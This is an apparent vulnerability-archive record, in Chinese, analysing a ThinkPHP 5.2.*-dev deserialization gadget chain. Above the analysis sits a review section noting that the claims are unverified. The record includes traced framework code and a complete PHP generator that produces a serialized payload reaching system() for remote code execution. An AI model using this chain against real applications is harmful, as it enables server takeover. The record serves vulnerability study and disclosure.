---
source: "hatch 补库批 20260928"
product: "ThinkPHP / Model.withAttr gadget"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Thinkphp 5.2.*-dev 反序列化漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：5.2.*-dev浮动，无commit或实际依赖锁；需不可信unserialize"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-63e8a01c2ce6e1c6be3cec90"
entity_id: "ve-63e8a01c2ce6e1c6be3cec90"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：5.2.*-dev浮动，无commit或实际依赖锁；需不可信unserialize

代码与实验材料：完整Windows→Pivot→withAttr调用和生成器；无应用入口，截图未视检

来源证据范围：Packagist及t00ls原文

- **事实待核（1）**：浮动开发版本无法确定影响范围；依据：5.2.*-dev随时间变化，必须固定原始框架提交。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **适用与权限边界（2）**：gadget能力误作默认远程漏洞；依据：依赖应用额外反序列化入口，正文未展示。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **适用与权限边界（3）**：链首大量依赖前文；依据：“跟5.1一样”未建立直接关联且无完整运行环境，应附最小前提。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Thinkphp 5.2.\*-dev 反序列化漏洞

一、漏洞简介
------------

所有Thinkphp版本下载链接

<https://packagist.org/packages/topthink/framework>

二、漏洞影响
------------

三、复现过程
------------

### 环境搭建

    composer create-project topthink/think=5.2.*-dev v5.2

### poc演示截图

![](./.resource/Thinkphp5.2.-dev反序列化漏洞/media/rId27.png)

### 调用链

![](./.resource/Thinkphp5.2.-dev反序列化漏洞/media/rId29.png)

### 单步调试

可以看到前面的链跟tp5.1.x的一样，这里不在列举，直接进去toArray函数，可以看到\$data可控

    public function toArray(): array
    {
    。。。
    $data = array_merge($this->data, $this->relation);

    foreach ($data as $key => $val) {
       if ($val instanceof Model || $val instanceof ModelCollection) {
         // 关联模型对象
         if (isset($this->visible[$key])) {
          $val->visible($this->visible[$key]);
         } elseif (isset($this->hidden[$key])) {
          $val->hidden($this->hidden[$key]);
         }
         // 关联模型对象
         $item[$key] = $val->toArray();
       } elseif (isset($this->visible[$key])) {
         $item[$key] = $this->getAttr($key);
       } elseif (!isset($this->hidden[$key]) && !$hasVisible) {
         $item[$key] = $this->getAttr($key);
       }
    }
    。。。
    public function getAttr(string $name)
    {
        try {
            $relation = false;
            $value    = $this->getData($name);
        } catch (InvalidArgumentException $e) {
            $relation = true;
            $value    = null;
        }

        return $this->getValue($name, $value, $relation);
    }
    public function getData(string $name = null)
       {
           if (is_null($name)) {
               return $this->data;
           }

           $fieldName = $this->getRealFieldName($name);

           if (array_key_exists($fieldName, $this->data)) {
               return $this->data[$fieldName];
               ...
           }
       }
    protected function getRealFieldName(string $name): string
    {
        return $this->strict ? $name : App::parseName($name);  //this->strict默认为true
    }

可以看到getAttr函数中的\$value可控，那么导致\$this-\>getValue(\$name,
\$value, \$relation);这里的三个参数都可控，跟进\$this-\>getValue(\$name,
\$value, \$relation);

    protected function getValue(string $name, $value, bool $relation = false)
    {
        // 检测属性获取器
        $fieldName = $this->getRealFieldName($name);
        $method    = 'get' . App::parseName($name, 1) . 'Attr';

        if (isset($this->withAttr[$fieldName])) {
           if ($relation) {
             $value = $this->getRelationValue($name);
           }

           $closure = $this->withAttr[$fieldName];
           $value   = $closure($value, $this->data);

这里\$fieldName、\$this-\>withAttr，导致\$closure也可控，最终直接产生RCE。如下图

![](./.resource/Thinkphp5.2.-dev反序列化漏洞/media/rId31.png)

补充：

    <?php

    $a = array();
    system('whoami',$a);

![](./.resource/Thinkphp5.2.-dev反序列化漏洞/media/rId32.png)

![](./.resource/Thinkphp5.2.-dev反序列化漏洞/media/rId33.png)

### poc v5.2.\*-dev

    <?php
    namespace think\process\pipes {
        class Windows
        {
            private $files;
            public function __construct($files)
            {
                $this->files = array($files);
            }
        }
    }

    namespace think\model\concern {
        trait Conversion
        {
            protected $append = array("Smi1e" => "1");
        }

        trait Attribute
        {
            private $data;
            private $withAttr = array("Smi1e" => "system");

            public function get($system)
            {
                $this->data = array("Smi1e" => "$system");
            }
        }
    }
    namespace think {
        abstract class Model
        {
            use model\concern\Attribute;
            use model\concern\Conversion;
        }
    }

    namespace think\model{
        use think\Model;
        class Pivot extends Model
        {
            public function __construct($system)
            {
                $this->get($system);
            }
        }
    }
    namespace{
        $Conver = new think\model\Pivot("whoami");
        $payload = new think\process\pipes\Windows($Conver);
        echo base64_encode(serialize($payload));
    }
    ?>

四、参考链接
------------

> <https://www.t00ls.net/thread-54324-1-1.html>
